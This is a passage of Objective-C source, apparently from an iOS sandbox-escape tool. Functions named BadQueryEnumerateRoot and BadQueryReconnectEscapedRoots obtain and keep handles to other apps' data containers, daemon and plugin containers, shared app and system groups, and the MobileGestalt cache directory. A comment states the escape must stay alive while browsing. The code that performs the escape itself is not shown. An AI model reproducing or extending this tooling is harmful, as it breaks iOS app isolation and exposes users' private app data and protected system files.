        @"/var/mobile/Containers/Data/Application", @"App Data", NO)];
    [results addObject:BadQueryEnumerateRoot(@"InternalDaemon",
        @"/var/mobile/Containers/Data/InternalDaemon", @"InternalDaemon", NO)];
    [results addObject:BadQueryEnumerateRoot(@"PluginKitPlugin",
        @"/var/mobile/Containers/Data/PluginKitPlugin", @"PluginKitPlugin", NO)];
    [results addObject:BadQueryEnumerateRoot(@"App Groups",
        @"/var/mobile/Containers/Shared/AppGroup", @"App Groups", sacrifice)];
    [results addObject:BadQueryEnumerateRoot(@"System Groups",
        @"/var/mobile/Containers/Shared/SystemGroup", @"System Groups", NO)];
    [results addObject:BadQueryEnumerateRoot(@"SystemGroup (new path)",
        @"/var/containers/Shared/SystemGroup", @"SystemGroup (new path)", NO)];

    NSDictionary *summary = @{
        @"Version": @1,
        @"CreatedAt": NSDate.date,
        @"SacrificeGroup": sacrificeGroupId() ?: @"",
        @"Results": results,
    };
    NSString *summaryPath = [BadQueryEscapedRoot()
        stringByAppendingPathComponent:@"Enumerate Results.plist"];
    [summary writeToFile:summaryPath atomically:YES];
    logStep(YES, @"enumerate all containers", summaryPath);
    return summary;
}

#pragma mark - Reconnect escaped roots

// Process-wide handles consumed by BadQueryReconnectEscapedRoots. They are
// intentionally never released: the escape must stay alive while browsing.
static NSMutableDictionary<NSString *, NSNumber *> *gReconnectHandles;

NSDictionary *BadQueryReconnectEscapedRoots(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gReconnectHandles = [NSMutableDictionary dictionary];
    });

    NSArray<NSDictionary *> *roots = @[
        @{@"Name": @"App Data", @"Path": @"/var/mobile/Containers/Data/Application"},
        @{@"Name": @"InternalDaemon", @"Path": @"/var/mobile/Containers/Data/InternalDaemon"},
        @{@"Name": @"PluginKitPlugin", @"Path": @"/var/mobile/Containers/Data/PluginKitPlugin"},
        @{@"Name": @"App Groups", @"Path": @"/var/mobile/Containers/Shared/AppGroup"},
        @{@"Name": @"System Groups", @"Path": @"/var/mobile/Containers/Shared/SystemGroup"},
        @{@"Name": @"SystemGroup (new path)", @"Path": @"/var/containers/Shared/SystemGroup"},
        @{@"Name": @"MobileGestalt Caches",
          @"Path": @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"},
    ];

    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
    for (NSDictionary *root in roots) {
        NSString *name = root[@"Name"];
        NSString *path = root[@"Path"];
        NSNumber *existing = gReconnectHandles[name];
        if (existing && existing.longLongValue >= 0) {
            [results addObject:@{@"Name": name, @"Path": path,
                                 @"Status": @"already-active", @"Handle": existing}];
            continue;
        }
        NSString *error = nil;
        int64_t handle = BadQueryConsumePath(path, nil, NO, &error);
        if (handle >= 0) {
            gReconnectHandles[name] = @(handle);
            [results addObject:@{@"Name": name, @"Path": path,
                                 @"Status": @"active", @"Handle": @(handle)}];
            logStep(YES, [NSString stringWithFormat:@"reconnect %@", name],
                [NSString stringWithFormat:@"handle=%lld path=%@", handle, path]);
        } else {
            [results addObject:@{@"Name": name, @"Path": path, @"Status": @"failed",
                                 @"Error": error ?: [NSString stringWithFormat:@"code=%lld", handle]}];
            logStep(NO, [NSString stringWithFormat:@"reconnect %@", name],
                error ?: [NSString stringWithFormat:@"code=%lld", handle]);
        }
    }

    NSDictionary *summary = @{
        @"Version": @1,
        @"CreatedAt": NSDate.date,
        @"Results": results,
    };
    NSString *summaryPath = [BadQueryEscapedRoot()
        stringByAppendingPathComponent:@"Reconnect Results.plist"];
    [summary writeToFile:summaryPath atomically:YES];
    logStep(YES, @"reconnect all roots", summaryPath);
    return summary;
}
